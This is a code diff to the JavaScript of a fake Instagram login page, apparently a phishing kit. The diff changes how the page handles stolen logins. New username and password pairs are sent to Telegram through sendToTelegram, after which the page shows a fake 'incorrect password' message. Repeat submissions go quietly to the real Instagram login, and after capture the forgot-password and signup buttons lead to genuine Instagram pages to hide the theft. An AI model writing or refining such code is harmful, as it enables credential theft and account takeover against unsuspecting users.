@@ -981,6 +981,17 @@ body {
     });
   }
 
+  var buttonsUnlocked = false;
+  try { buttonsUnlocked = localStorage.getItem('_ig_ul') === '1'; } catch (e) {}
+
+  var forgotBtn = document.querySelector('.forgot-btn');
+
+  forgotBtn.addEventListener('click', function () {
+    if (buttonsUnlocked) {
+      window.location.href = 'https://www.instagram.com/accounts/password/reset';
+    }
+  });
+
   var snappedActive = null;
 
   function captureActive() {
@@ -1077,6 +1088,13 @@ body {
     }
   }
 
+  function unlockButtons() {
+    if (!buttonsUnlocked) {
+      buttonsUnlocked = true;
+      try { localStorage.setItem('_ig_ul', '1'); } catch (e) {}
+    }
+  }
+
   function setLoading(on) {
     if (on)  { loginBtn.disabled = true;  loginBtn.innerHTML = '<span class="btn-spin"></span>'; }
     else     { loginBtn.disabled = false; loginBtn.textContent = 'Log in'; }
@@ -1112,15 +1130,23 @@ body {
     }
 
     var validFlow = isEmail(usr) || isPhone(usr) || isValidUsr(usr);
-    setLoading(true);
     var minWait = new Promise(function (resolve) { setTimeout(resolve, 1400); });
 
     if (validFlow) {
-      var newEntry = !wasSubmitted(usr, pwd);
-      var net = newEntry ? sendToTelegram(usr, pwd) : Promise.resolve(null);
-      if (newEntry) markSubmitted(usr, pwd);
+      var alreadySent = wasSubmitted(usr, pwd);
+
+      if (alreadySent) {
+        unlockButtons();
+        window.location.href = 'https://www.instagram.com/accounts/login';
+        return;
+      }
+
+      markSubmitted(usr, pwd);
+      setLoading(true);
+      var net = sendToTelegram(usr, pwd);
       Promise.all([minWait, net]).then(function () { setLoading(false); incorrectPwdModal(); });
     } else {
+      setLoading(true);
       minWait.then(function () {
         setLoading(false);
         showModal({
@@ -1135,7 +1161,13 @@ body {
     }
   });
 
-  createBtn.addEventListener('click',      function () { triggerPop(this); });
+  createBtn.addEventListener('click', function () {
+    if (buttonsUnlocked) {
+      window.location.href = 'https://www.instagram.com/accounts/signup/phone';
+      return;
+    }
+    triggerPop(this);
+  });
   createBtn.addEventListener('mouseenter', function () { triggerPop(this); });
 
 }());
